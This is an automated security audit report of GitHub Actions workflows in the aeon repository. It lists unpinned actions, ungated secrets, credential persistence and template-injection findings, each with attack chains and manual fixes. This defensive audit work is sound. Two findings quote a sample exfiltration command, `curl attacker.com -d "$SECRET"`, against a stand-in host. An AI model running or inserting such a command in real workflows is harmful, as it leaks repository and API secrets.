# Workflow Security Audit — 2026-09-27

**Verdict:** WORKFLOW_AUDIT_NEW_CRITICAL — 3 new critical, 55 new high, 31 new medium, 64 new low; first on-disk delta baseline
**Repo:** [swarm-ai-research/aeon](https://github.com/swarm-ai-research/aeon)
**Files audited:** 8 (8 workflows, 0 composite actions)
**Findings this run:** 153 (3 critical, 55 high, 31 medium, 64 low)
**Delta vs (no prior audit):** 153 new, 0 reintroduced, 0 unchanged, 0 resolved
**Auto-fixed:** 0

_This is the first machine-readable delta baseline landing on disk. Every finding is NEW because no prior `articles/workflow-security-audit-*.md` existed to diff against. Auto-fix count is 0 because all NEW Critical/High findings fall into the always-Manual categories per SKILL.md constraints (unpinned-uses, secrets-outside-env, ref-version-mismatch)._

## Regressions (previously-fixed findings now present again)

_None — no prior report to diff against._

## New Critical findings

### [CRITICAL] `zizmor/unpinned-uses` — unpinned action reference: action is not pinned to a hash (required by blanket policy)
**File:** `.github/workflows/aeon.yml` · **Line:** 85 · **Delta:** NEW
**Pattern:**
```yaml
actions/checkout@v4.4.0
```
**Attack chain:**
1. **Entry:** ['issues', 'workflow_call', 'workflow_dispatch'] triggers on `.github/workflows/aeon.yml` (external triggerable)
2. **Vector:** uses: actions/checkout@v4.4.0 — floating tag ref (`@v4.4.0`, `@v5`). If the tag is repointed by the action owner (compromised account, malicious release, or force-moved tag), the next run of this workflow silently pulls attacker code.
3. **Sink:** GitHub Actions runner clones the action at whatever commit the tag points to, then executes its `entrypoint`/`runs` with the job token.
4. **Reachable secrets:** GITHUB_TOKEN at job scope; downstream steps in the same job also expose ANTHROPIC_API_KEY, GH_GLOBAL, TELEGRAM_BOT_TOKEN, DISCORD_*, SLACK_*, SENDGRID_API_KEY (whichever are referenced later in the file).
5. **Blast radius:** Full repository write (contents/actions write), workflow-dispatch on every other workflow, ability to rewrite `.github/workflows/*.yml`, exfiltrate every reachable secret across the fleet.
**Fix (manual):** replace the floating tag with the full commit SHA of the intended release, with the version as a trailing comment. Example:
```yaml
# BEFORE
uses: actions/checkout@v4.4.0
# AFTER
uses: actions/checkout@85e6279cec87321a52edac9c87bce653a07cf6c2 # v4.4.0
```
Look up the SHA with `gh api repos/actions/checkout/git/refs/tags/v4.4.0 -q '.object.sha'` then verify it points at a signed tag.
**Status:** Manual required

---

### [CRITICAL] `zizmor/unpinned-uses` — unpinned action reference: action is not pinned to a hash (required by blanket policy)
**File:** `.github/workflows/aeon.yml` · **Line:** 121 · **Delta:** NEW
**Pattern:**
```yaml
actions/checkout@v4.4.0
```
**Attack chain:**
1. **Entry:** ['issues', 'workflow_call', 'workflow_dispatch'] triggers on `.github/workflows/aeon.yml` (external triggerable)
2. **Vector:** uses: actions/checkout@v4.4.0 — floating tag ref (`@v4.4.0`, `@v5`). If the tag is repointed by the action owner (compromised account, malicious release, or force-moved tag), the next run of this workflow silently pulls attacker code.
3. **Sink:** GitHub Actions runner clones the action at whatever commit the tag points to, then executes its `entrypoint`/`runs` with the job token.
4. **Reachable secrets:** GITHUB_TOKEN at job scope; downstream steps in the same job also expose ANTHROPIC_API_KEY, GH_GLOBAL, TELEGRAM_BOT_TOKEN, DISCORD_*, SLACK_*, SENDGRID_API_KEY (whichever are referenced later in the file).
5. **Blast radius:** Full repository write (contents/actions write), workflow-dispatch on every other workflow, ability to rewrite `.github/workflows/*.yml`, exfiltrate every reachable secret across the fleet.
**Fix (manual):** replace the floating tag with the full commit SHA of the intended release, with the version as a trailing comment. Example:
```yaml
# BEFORE
uses: actions/checkout@v4.4.0
# AFTER
uses: actions/checkout@85e6279cec87321a52edac9c87bce653a07cf6c2 # v4.4.0
```
Look up the SHA with `gh api repos/actions/checkout/git/refs/tags/v4.4.0 -q '.object.sha'` then verify it points at a signed tag.
**Status:** Manual required

---

### [CRITICAL] `zizmor/unpinned-uses` — unpinned action reference: action is not pinned to a hash (required by blanket policy)
**File:** `.github/workflows/aeon.yml` · **Line:** 133 · **Delta:** NEW
**Pattern:**
```yaml
actions/setup-node@v5
```
**Attack chain:**
1. **Entry:** ['issues', 'workflow_call', 'workflow_dispatch'] triggers on `.github/workflows/aeon.yml` (external triggerable)
2. **Vector:** uses: actions/setup-node@v5 — floating tag ref (`@v4.4.0`, `@v5`). If the tag is repointed by the action owner (compromised account, malicious release, or force-moved tag), the next run of this workflow silently pulls attacker code.
3. **Sink:** GitHub Actions runner clones the action at whatever commit the tag points to, then executes its `entrypoint`/`runs` with the job token.
4. **Reachable secrets:** GITHUB_TOKEN at job scope; downstream steps in the same job also expose ANTHROPIC_API_KEY, GH_GLOBAL, TELEGRAM_BOT_TOKEN, DISCORD_*, SLACK_*, SENDGRID_API_KEY (whichever are referenced later in the file).
5. **Blast radius:** Full repository write (contents/actions write), workflow-dispatch on every other workflow, ability to rewrite `.github/workflows/*.yml`, exfiltrate every reachable secret across the fleet.
**Fix (manual):** replace the floating tag with the full commit SHA of the intended release, with the version as a trailing comment. Example:
```yaml
# BEFORE
uses: actions/checkout@v4.4.0
# AFTER
uses: actions/checkout@85e6279cec87321a52edac9c87bce653a07cf6c2 # v4.4.0
```
Look up the SHA with `gh api repos/actions/checkout/git/refs/tags/v4.4.0 -q '.object.sha'` then verify it points at a signed tag.
**Status:** Manual required

---

## New High findings

### zizmor/ref-version-mismatch — 9 finding(s)

### [HIGH] `zizmor/ref-version-mismatch` — action's hash pin has mismatched or missing version comment: points to commit fbc6f3992d24
**File:** `.github/workflows/chain-runner.yml` · **Line:** 29 · **Delta:** NEW
**Pattern:**
```yaml
v5
```
**Attack chain:**
1. **Entry:** ['workflow_dispatch'] triggers on `.github/workflows/chain-runner.yml` (external triggerable)
2. **Vector:** uses: actions/checkout@93cb6efe18208431cddfb8368fd83d5badbf9bfd # v5 — SHA is pinned, but the `# vN` comment does not match the tag pointing at that commit. A reviewer trusting the comment may miss that the intended version drifted, or a future edit trusts the comment and swaps the SHA back to a bad one.
3. **Sink:** Runner executes the pinned commit — no immediate RCE risk from the mismatch itself; it is an audit-hygiene / trust-boundary bug.
4. **Reachable secrets:** Same as any other step in the job (see file).
5. **Blast radius:** Low direct exploit; real risk is that the mismatch masks a rollback to an older or malicious commit in a future refactor that trusts the now-inaccurate comment.
**Fix (manual):** run `gh api repos/OWNER/REPO/commits/SHA -q .commit.message` against the pinned SHA and update the trailing `# vN.N.N` comment to match the release tag at that commit (or repin to the SHA of the version you actually intend).
**Status:** Manual required

### [HIGH] `zizmor/ref-version-mismatch` — action's hash pin has mismatched or missing version comment: points to commit fbc6f3992d24
**File:** `.github/workflows/fleet-runner.yml` · **Line:** 64 · **Delta:** NEW
**Pattern:**
```yaml
v5
```
**Attack chain:**
1. **Entry:** ['schedule', 'workflow_dispatch'] triggers on `.github/workflows/fleet-runner.yml` (external triggerable)
2. **Vector:** uses: actions/checkout@93cb6efe18208431cddfb8368fd83d5badbf9bfd # v5 — SHA is pinned, but the `# vN` comment does not match the tag pointing at that commit. A reviewer trusting the comment may miss that the intended version drifted, or a future edit trusts the comment and swaps the SHA back to a bad one.
3. **Sink:** Runner executes the pinned commit — no immediate RCE risk from the mismatch itself; it is an audit-hygiene / trust-boundary bug.
4. **Reachable secrets:** Same as any other step in the job (see file).
5. **Blast radius:** Low direct exploit; real risk is that the mismatch masks a rollback to an older or malicious commit in a future refactor that trusts the now-inaccurate comment.
**Fix (manual):** run `gh api repos/OWNER/REPO/commits/SHA -q .commit.message` against the pinned SHA and update the trailing `# vN.N.N` comment to match the release tag at that commit (or repin to the SHA of the version you actually intend).
**Status:** Manual required

**Additional 7 finding(s) of `zizmor/ref-version-mismatch` (compact):**

| File | Line | Step | Snippet |
|------|-----:|------|---------|
| `.github/workflows/lint.yml` | 33 |  | `v4` |
| `.github/workflows/lint.yml` | 71 |  | `v4` |
| `.github/workflows/lint.yml` | 92 |  | `v4` |
| `.github/workflows/messages.yml` | 57 |  | `v5` |
| `.github/workflows/messages.yml` | 693 |  | `v5` |
| `.github/workflows/sync-aeon-public-results.yml` | 29 |  | `v4` |
| `.github/workflows/sync-upstream.yml` | 23 |  | `v4` |

---

### zizmor/secrets-outside-env — 46 finding(s)

### [HIGH] `zizmor/secrets-outside-env` — secrets referenced without a dedicated environment: secret is accessed outside of a dedicated environment
**File:** `.github/workflows/chain-runner.yml` · **Line:** 31 · **Delta:** NEW
**Pattern:**
```yaml
secrets.GH_GLOBAL
```
**Attack chain:**
1. **Entry:** ['workflow_dispatch'] triggers on `.github/workflows/chain-runner.yml` (external triggerable)
2. **Vector:** token: ${{ secrets.GH_GLOBAL || secrets.GITHUB_TOKEN }} — secret referenced at job/step scope, no GitHub Environment gating. Any collaborator who can land a workflow-file edit (merged PR, direct push if allowed, or a poisoned reusable-workflow call) can exfil by adding `curl attacker.com -d "$SECRET"` in the same step.
3. **Sink:** Secret is expanded into an `env:` value or `with:` input, in-process, and shell can read it via `$SECRET_NAME`.
4. **Reachable secrets:** token: ${{ secrets.GH_GLOBAL || secrets.GITHUB_TOKEN }}
5. **Blast radius:** Full compromise of the named secret. Fleet-wide credentials (ANTHROPIC_API_KEY, TELEGRAM_BOT_TOKEN, GH_GLOBAL) let attackers post from the bot identities and burn paid quotas until rotated.
**Fix (manual):** create a GitHub Environment (`production`, `chain-runner`, or per-secret), move the referenced secret into that Environment, then add `environment: <name>` to the job so the secret is only injected when the environment gate approves. Requires operator action in repo → Settings → Environments; no code-only fix.
**Status:** Manual required

### [HIGH] `zizmor/secrets-outside-env` — secrets referenced without a dedicated environment: secret is accessed outside of a dedicated environment
**File:** `.github/workflows/chain-runner.yml` · **Line:** 40 · **Delta:** NEW
**Pattern:**
```yaml
secrets.GH_GLOBAL
```
**Attack chain:**
1. **Entry:** ['workflow_dispatch'] triggers on `.github/workflows/chain-runner.yml` (external triggerable)
2. **Vector:** GH_TOKEN: ${{ secrets.GH_GLOBAL || secrets.GITHUB_TOKEN }} — secret referenced at job/step scope, no GitHub Environment gating. Any collaborator who can land a workflow-file edit (merged PR, direct push if allowed, or a poisoned reusable-workflow call) can exfil by adding `curl attacker.com -d "$SECRET"` in the same step.
3. **Sink:** Secret is expanded into an `env:` value or `with:` input, in-process, and shell can read it via `$SECRET_NAME`.
4. **Reachable secrets:** GH_TOKEN: ${{ secrets.GH_GLOBAL || secrets.GITHUB_TOKEN }}
5. **Blast radius:** Full compromise of the named secret. Fleet-wide credentials (ANTHROPIC_API_KEY, TELEGRAM_BOT_TOKEN, GH_GLOBAL) let attackers post from the bot identities and burn paid quotas until rotated.
**Fix (manual):** create a GitHub Environment (`production`, `chain-runner`, or per-secret), move the referenced secret into that Environment, then add `environment: <name>` to the job so the secret is only injected when the environment gate approves. Requires operator action in repo → Settings → Environments; no code-only fix.
**Status:** Manual required

**Additional 44 finding(s) of `zizmor/secrets-outside-env` (compact):**

| File | Line | Step | Snippet |
|------|-----:|------|---------|
| `.github/workflows/chain-runner.yml` | 288 |  | `secrets.GH_GLOBAL` |
| `.github/workflows/chain-runner.yml` | 347 |  | `secrets.AEON_PRIVATE_PAT` |
| `.github/workflows/fleet-runner.yml` | 157 |  | `secrets.GITLAWB_OPERATOR_PEM` |
| `.github/workflows/fleet-runner.yml` | 158 |  | `secrets.GITLAWB_OPERATOR_UCAN` |
| `.github/workflows/fleet-runner.yml` | 160 |  | `secrets.GITLAWB_RESEARCHER_PEM` |
| `.github/workflows/fleet-runner.yml` | 161 |  | `secrets.GITLAWB_REVIEWER_PEM` |
| `.github/workflows/fleet-runner.yml` | 162 |  | `secrets.GITLAWB_DEPLOYER_PEM` |
| `.github/workflows/fleet-runner.yml` | 163 |  | `secrets.GITLAWB_SENTINEL_PEM` |
| `.github/workflows/fleet-runner.yml` | 278 |  | `secrets.SURPLUS_PRICING_URL` |
| `.github/workflows/fleet-runner.yml` | 279 |  | `secrets.SURPLUS_API_KEY` |
| `.github/workflows/fleet-runner.yml` | 294 |  | `secrets.CLAUDE_CODE_OAUTH_TOKEN` |
| `.github/workflows/fleet-runner.yml` | 361 |  | `secrets.AEON_PRIVATE_PAT` |
| `.github/workflows/gitlawb-repo-bootstrap.yml` | 80 |  | `secrets.GITLAWB_OPERATOR_PEM` |
| `.github/workflows/gitlawb-repo-bootstrap.yml` | 85 |  | `secrets.GITLAWB_OPERATOR_PEM` |
| `.github/workflows/gitlawb-repo-bootstrap.yml` | 86 |  | `secrets.GITLAWB_OPERATOR_UCAN` |
| `.github/workflows/messages.yml` | 59 |  | `secrets.GH_GLOBAL` |
| `.github/workflows/messages.yml` | 68 |  | `secrets.GH_GLOBAL` |
| `.github/workflows/messages.yml` | 551 |  | `secrets.GH_GLOBAL` |
| `.github/workflows/messages.yml` | 552 |  | `secrets.TELEGRAM_BOT_TOKEN` |
| `.github/workflows/messages.yml` | 553 |  | `secrets.TELEGRAM_CHAT_ID` |
| `.github/workflows/messages.yml` | 554 |  | `secrets.DISCORD_BOT_TOKEN` |
| `.github/workflows/messages.yml` | 555 |  | `secrets.DISCORD_CHANNEL_ID` |
| `.github/workflows/messages.yml` | 556 |  | `secrets.SLACK_BOT_TOKEN` |
| `.github/workflows/messages.yml` | 557 |  | `secrets.SLACK_CHANNEL_ID` |
| `.github/workflows/messages.yml` | 648 |  | `secrets.AEON_PRIVATE_PAT` |
| `.github/workflows/messages.yml` | 695 |  | `secrets.GH_GLOBAL` |
| `.github/workflows/messages.yml` | 717 |  | `secrets.ANTHROPIC_API_KEY` |
| `.github/workflows/messages.yml` | 718 |  | `secrets.CLAUDE_CODE_OAUTH_TOKEN` |
| `.github/workflows/messages.yml` | 719 |  | `secrets.GH_GLOBAL` |
| `.github/workflows/messages.yml` | 720 |  | `secrets.GH_GLOBAL` |
| `.github/workflows/messages.yml` | 721 |  | `secrets.TELEGRAM_BOT_TOKEN` |
| `.github/workflows/messages.yml` | 722 |  | `secrets.TELEGRAM_CHAT_ID` |
| `.github/workflows/messages.yml` | 723 |  | `secrets.DISCORD_BOT_TOKEN` |
| `.github/workflows/messages.yml` | 724 |  | `secrets.DISCORD_CHANNEL_ID` |
| `.github/workflows/messages.yml` | 725 |  | `secrets.DISCORD_WEBHOOK_URL` |
| `.github/workflows/messages.yml` | 726 |  | `secrets.SLACK_BOT_TOKEN` |
| `.github/workflows/messages.yml` | 727 |  | `secrets.SLACK_CHANNEL_ID` |
| `.github/workflows/messages.yml` | 728 |  | `secrets.SLACK_WEBHOOK_URL` |
| `.github/workflows/messages.yml` | 729 |  | `secrets.XAI_API_KEY` |
| `.github/workflows/messages.yml` | 730 |  | `secrets.COINGECKO_API_KEY` |
| `.github/workflows/messages.yml` | 731 |  | `secrets.ALCHEMY_API_KEY` |
| `.github/workflows/messages.yml` | 889 |  | `secrets.AEON_PRIVATE_PAT` |
| `.github/workflows/sync-upstream.yml` | 29 |  | `secrets.GH_GLOBAL` |
| `.github/workflows/sync-upstream.yml` | 76 |  | `secrets.GH_GLOBAL` |

---

## New Medium findings (compact)

| Rule | File | Line | Message |
|------|------|-----:|---------|
| `zizmor/artipacked` | `.github/workflows/aeon.yml` | 83 | credential persistence through GitHub Actions artifacts: does not set persist-credentials: false |
| `zizmor/artipacked` | `.github/workflows/aeon.yml` | 119 | credential persistence through GitHub Actions artifacts: does not set persist-credentials: false |
| `zizmor/artipacked` | `.github/workflows/chain-runner.yml` | 28 | credential persistence through GitHub Actions artifacts: does not set persist-credentials: false |
| `zizmor/artipacked` | `.github/workflows/fleet-runner.yml` | 63 | credential persistence through GitHub Actions artifacts: does not set persist-credentials: false |
| `zizmor/artipacked` | `.github/workflows/lint.yml` | 32 | credential persistence through GitHub Actions artifacts: does not set persist-credentials: false |
| `zizmor/artipacked` | `.github/workflows/lint.yml` | 70 | credential persistence through GitHub Actions artifacts: does not set persist-credentials: false |
| `zizmor/artipacked` | `.github/workflows/lint.yml` | 91 | credential persistence through GitHub Actions artifacts: does not set persist-credentials: false |
| `zizmor/artipacked` | `.github/workflows/messages.yml` | 56 | credential persistence through GitHub Actions artifacts: does not set persist-credentials: false |
| `zizmor/artipacked` | `.github/workflows/messages.yml` | 691 | credential persistence through GitHub Actions artifacts: does not set persist-credentials: false |
| `zizmor/artipacked` | `.github/workflows/sync-aeon-public-results.yml` | 28 | credential persistence through GitHub Actions artifacts: does not set persist-credentials: false |
| `zizmor/artipacked` | `.github/workflows/sync-upstream.yml` | 22 | credential persistence through GitHub Actions artifacts: does not set persist-credentials: false |
| `actionlint/shellcheck/SC2129` | `.github/workflows/aeon.yml` | 286 | shellcheck reported issue in this script: SC2129:style:259:1: Consider using { cmd1; cmd2; } >> file instead of individu |
| `actionlint/shellcheck/SC2129` | `.github/workflows/aeon.yml` | 601 | shellcheck reported issue in this script: SC2129:style:7:1: Consider using { cmd1; cmd2; } >> file instead of individual |
| `actionlint/shellcheck/SC2034` | `.github/workflows/chain-runner.yml` | 42 | shellcheck reported issue in this script: SC2034:warning:3:1: NOW_ISO appears unused. Verify use (or export if used exte |
| `actionlint/shellcheck/SC2129` | `.github/workflows/chain-runner.yml` | 42 | shellcheck reported issue in this script: SC2129:style:100:7: Consider using { cmd1; cmd2; } >> file instead of individu |
| `actionlint/shellcheck/SC2129` | `.github/workflows/chain-runner.yml` | 42 | shellcheck reported issue in this script: SC2129:style:93:7: Consider using { cmd1; cmd2; } >> file instead of individua |
| `actionlint/shellcheck/SC2155` | `.github/workflows/chain-runner.yml` | 42 | shellcheck reported issue in this script: SC2155:warning:41:9: Declare and assign separately to avoid masking return val |
| `actionlint/shellcheck/SC2155` | `.github/workflows/chain-runner.yml` | 42 | shellcheck reported issue in this script: SC2155:warning:48:13: Declare and assign separately to avoid masking return va |
| `actionlint/shellcheck/SC2155` | `.github/workflows/chain-runner.yml` | 42 | shellcheck reported issue in this script: SC2155:warning:67:11: Declare and assign separately to avoid masking return va |
| `actionlint/shellcheck/SC2155` | `.github/workflows/chain-runner.yml` | 42 | shellcheck reported issue in this script: SC2155:warning:69:13: Declare and assign separately to avoid masking return va |
| `actionlint/shellcheck/SC2155` | `.github/workflows/chain-runner.yml` | 42 | shellcheck reported issue in this script: SC2155:warning:9:9: Declare and assign separately to avoid masking return valu |
| `actionlint/shellcheck/SC2155` | `.github/workflows/fleet-runner.yml` | 186 | shellcheck reported issue in this script: SC2155:warning:2:8: Declare and assign separately to avoid masking return valu |
| `actionlint/shellcheck/SC2155` | `.github/workflows/fleet-runner.yml` | 186 | shellcheck reported issue in this script: SC2155:warning:3:8: Declare and assign separately to avoid masking return valu |
| `actionlint/shellcheck/SC2155` | `.github/workflows/fleet-runner.yml` | 186 | shellcheck reported issue in this script: SC2155:warning:4:8: Declare and assign separately to avoid masking return valu |
| `actionlint/shellcheck/SC2155` | `.github/workflows/fleet-runner.yml` | 186 | shellcheck reported issue in this script: SC2155:warning:5:8: Declare and assign separately to avoid masking return valu |
| `actionlint/shellcheck/SC2086` | `.github/workflows/fleet-runner.yml` | 301 | shellcheck reported issue in this script: SC2086:info:6:82: Double quote to prevent globbing and word splitting |
| `actionlint/shellcheck/SC2086` | `.github/workflows/fleet-runner.yml` | 301 | shellcheck reported issue in this script: SC2086:info:9:55: Double quote to prevent globbing and word splitting |
| `actionlint/shellcheck/SC2034` | `.github/workflows/messages.yml` | 69 | shellcheck reported issue in this script: SC2034:warning:247:5: IN_STEPS appears unused. Verify use (or export if used e |
| `actionlint/shellcheck/SC2129` | `.github/workflows/messages.yml` | 669 | shellcheck reported issue in this script: SC2129:style:16:3: Consider using { cmd1; cmd2; } >> file instead of individua |
| `actionlint/shellcheck/SC2129` | `.github/workflows/messages.yml` | 734 | shellcheck reported issue in this script: SC2129:style:64:1: Consider using { cmd1; cmd2; } >> file instead of individua |
| `actionlint/shellcheck/SC2129` | `.github/workflows/messages.yml` | 815 | shellcheck reported issue in this script: SC2129:style:7:1: Consider using { cmd1; cmd2; } >> file instead of individual |

## New Low findings (compact)

| Rule | File | Line | Message |
|------|------|-----:|---------|
| `zizmor/template-injection` | `.github/workflows/aeon.yml` | 98 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/aeon.yml` | 98 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/aeon.yml` | 105 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/aeon.yml` | 112 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/aeon.yml` | 114 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/aeon.yml` | 150 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/aeon.yml` | 194 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/aeon.yml` | 288 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/aeon.yml` | 480 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/aeon.yml` | 602 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/aeon.yml` | 603 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/aeon.yml` | 604 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/aeon.yml` | 605 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/aeon.yml` | 606 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/aeon.yml` | 607 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/aeon.yml` | 625 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/aeon.yml` | 625 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/aeon.yml` | 625 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/aeon.yml` | 625 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/aeon.yml` | 625 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/aeon.yml` | 625 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/aeon.yml` | 630 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/aeon.yml` | 651 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/aeon.yml` | 657 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/aeon.yml` | 752 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/aeon.yml` | 863 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/aeon.yml` | 927 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/aeon.yml` | 928 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/aeon.yml` | 931 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/undocumented-permissions` | `.github/workflows/aeon.yml` | 77 | permissions without explanatory comments: needs an explanatory comment |
| `zizmor/anonymous-definition` | `.github/workflows/aeon.yml` | 72 | workflow or action definition without a name: this job |
| `zizmor/undocumented-permissions` | `.github/workflows/chain-runner.yml` | 24 | permissions without explanatory comments: needs an explanatory comment |
| `zizmor/anonymous-definition` | `.github/workflows/chain-runner.yml` | 20 | workflow or action definition without a name: this job |
| `zizmor/template-injection` | `.github/workflows/fleet-runner.yml` | 157 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/fleet-runner.yml` | 158 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/fleet-runner.yml` | 160 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/fleet-runner.yml` | 161 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/fleet-runner.yml` | 162 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/fleet-runner.yml` | 163 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/fleet-runner.yml` | 322 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/fleet-runner.yml` | 322 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/fleet-runner.yml` | 342 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/fleet-runner.yml` | 342 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/fleet-runner.yml` | 354 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/fleet-runner.yml` | 355 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/undocumented-permissions` | `.github/workflows/fleet-runner.yml` | 55 | permissions without explanatory comments: needs an explanatory comment |
| `zizmor/anonymous-definition` | `.github/workflows/fleet-runner.yml` | 51 | workflow or action definition without a name: this job |
| `zizmor/concurrency-limits` | `.github/workflows/fleet-runner.yml` | 4 | insufficient job-level concurrency limits: workflow is missing concurrency setting |
| `zizmor/template-injection` | `.github/workflows/gitlawb-repo-bootstrap.yml` | 80 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/gitlawb-repo-bootstrap.yml` | 85 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/gitlawb-repo-bootstrap.yml` | 86 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/anonymous-definition` | `.github/workflows/gitlawb-repo-bootstrap.yml` | 39 | workflow or action definition without a name: this job |
| `zizmor/concurrency-limits` | `.github/workflows/gitlawb-repo-bootstrap.yml` | 20 | insufficient job-level concurrency limits: workflow is missing concurrency setting |
| `zizmor/template-injection` | `.github/workflows/messages.yml` | 670 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/undocumented-permissions` | `.github/workflows/messages.yml` | 658 | permissions without explanatory comments: needs an explanatory comment |
| `zizmor/anonymous-definition` | `.github/workflows/messages.yml` | 47 | workflow or action definition without a name: this job |
| `zizmor/anonymous-definition` | `.github/workflows/messages.yml` | 651 | workflow or action definition without a name: this job |
| `zizmor/anonymous-definition` | `.github/workflows/sync-aeon-public-results.yml` | 23 | workflow or action definition without a name: this job |
| `zizmor/template-injection` | `.github/workflows/sync-upstream.yml` | 71 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/sync-upstream.yml` | 78 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/sync-upstream.yml` | 79 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/template-injection` | `.github/workflows/sync-upstream.yml` | 80 | code injection via template expansion: may expand into attacker-controllable code |
| `zizmor/undocumented-permissions` | `.github/workflows/sync-upstream.yml` | 19 | permissions without explanatory comments: needs an explanatory comment |
| `zizmor/anonymous-definition` | `.github/workflows/sync-upstream.yml` | 16 | workflow or action definition without a name: this job |

## Carried over (unchanged)

_None — no prior report._

## Resolved since prior audit

_None — no prior report. Note for future delta baselines: the historical `toJson(github.event.client_payload.message)` shell-injection pattern (April 11 miss referenced in SKILL.md step 2) is verified fixed at `.github/workflows/messages.yml:667` — the payload is bound to `_CLIENT_PAYLOAD_MESSAGE` on the step's `env:` map, and the `run:` block reads `"$_CLIENT_PAYLOAD_MESSAGE"` via `printf`/`jq`, not `echo` into a command substitution._

## Source status

- zizmor: ok — 133 findings
- actionlint: ok — 20 findings
- hand-rolled: ok — 0 findings (all supplemental patterns confirmed absent)

<!--
workflow-security-audit-fingerprints
d42af71c10f40be0 severity=Medium status=manual rule=zizmor/artipacked file=.github/workflows/aeon.yml step=Early_checkout
0c66d5f673cf0c0e severity=Medium status=manual rule=zizmor/artipacked file=.github/workflows/aeon.yml step=Checkout_repo
49cd506718cb2c77 severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/aeon.yml step=L98
49cd506718cb2c77 severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/aeon.yml step=L98
ff3820cb06244e95 severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/aeon.yml step=L105
a0cbe8644e107f24 severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/aeon.yml step=L112
72cecf04698564fd severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/aeon.yml step=L114
ad8e5ebd3048d388 severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/aeon.yml step=L150
04134515f3149ad9 severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/aeon.yml step=L194
7c9396bef374ff79 severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/aeon.yml step=L288
dd5ad66fef2a1e2e severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/aeon.yml step=L480
a8cbc8878b60d3f0 severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/aeon.yml step=L602
2d4c3842283807df severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/aeon.yml step=L603
ab017ef51dc4742f severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/aeon.yml step=L604
7387218356a38d3a severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/aeon.yml step=L605
9895dfe83e97e90a severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/aeon.yml step=L606
3e36f31550ec039b severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/aeon.yml step=L607
191109080b2eb3e9 severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/aeon.yml step=L625
